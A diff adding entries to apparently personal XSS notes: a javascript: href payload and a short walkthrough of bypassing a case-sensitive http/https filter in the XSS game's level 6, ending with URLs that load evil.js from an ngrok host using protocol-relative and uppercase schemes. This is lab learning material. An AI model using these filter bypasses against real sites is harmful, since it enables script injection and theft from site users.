@@ -668,3 +668,39 @@ How to do XSS in <a href ""></a>
 ---------------------------------
 
 <a href "javascript:alert(1)"
+___________________________________________________________________________________________________________________________________________________________________
+
+http and https is blocked, how to bypassed?
+--------------------------------------------
+    function setInnerText(element, value) {
+      if (element.innerText) {
+        element.innerText = value;
+      } else {
+        element.textContent = value;
+      }
+    }
+
+    function includeGadget(url) {
+      var scriptEl = document.createElement('script');
+
+      // This will totally prevent us from loading evil URLs!
+      if (url.match(/^https?:\/\//)) {
+        setInnerText(document.getElementById("log"),
+          "Sorry, cannot load a URL containing \"http\".");
+        return;
+      }
+
+ if (url.match(/^https?:\/\//)) 
+
+^ asserts the position at the start of the string.
+
+https? matches "http" followed by an optional "s" (to cover both "http" and "https").
+
+:\/\/ matches "://".
+
+So, we have to bypass with uppercase (or) without having https or http
+----------------------------------------------------------------------
+
+https://xss-game.appspot.com/level6/frame#//99df-210-10-6-227.ngrok-free.app/evil.js
+
+https://xss-game.appspot.com/level6/frame#HTTPS://99df-210-10-6-227.ngrok-free.app/evil.js
